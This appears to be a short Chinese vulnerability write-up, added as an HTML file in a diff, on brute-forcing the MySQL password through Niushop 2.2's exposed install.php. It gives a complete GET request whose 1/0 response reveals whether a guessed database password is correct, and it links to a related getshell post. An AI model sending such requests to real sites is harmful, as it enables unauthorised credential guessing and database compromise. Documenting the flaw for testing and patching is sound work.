@@ -1,0 +1,36 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="niushop-单商户-22-爆破mysql密码"><span class="csDE05BCC">Niushop </span><span class="csECDA2D3">单商户</span><span class="csDE05BCC"> 2.2 </span><span class="csECDA2D3">爆破</span><span class="csDE05BCC">MySQL</span><span class="csECDA2D3">密码</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">Version</span><span class="cs9C1B1871">：单商户</span><span class="cs8926E06"> 2.2</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h3 class="cs868C439D">
+			<a name="安装爆破mysql密码"><span class="csD6CA00D2">安装爆破</span><span class="csD1E291E2">MySQL</span><span class="csD6CA00D2">密码</span></a></h3>
+		<p class="cs3A447A38"><span class="cs9FB05234">GET /niushop/install.php?action=true&amp;dbserver=127.0.0.1&amp;dbpassword=root2&amp;dbusername=root&amp;dbname=niushop_b2c HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 127.0.0.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Requested-With: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://127.0.0.1/niushop/install.php?refresh</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: action=db</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Niushop/Niushop%20%e5%8d%95%e5%95%86%e6%88%b7%202.2%20%e7%88%86%e7%a0%b4MySQL%e5%af%86%e7%a0%81_files/image0.jpg" width="560" height="439" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">爆破成功返回</span><span class="cs8926E06">1</span><span class="cs9C1B1871">，密码错误返回</span><span class="cs8926E06">0</span></p><h2 class="cs868C439D">
+			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
+		<p class="cs6FD73CFB"><span class="cs8926E06">https://y4er.com/post/niushop-getshell/</span></p></body>
+</html>
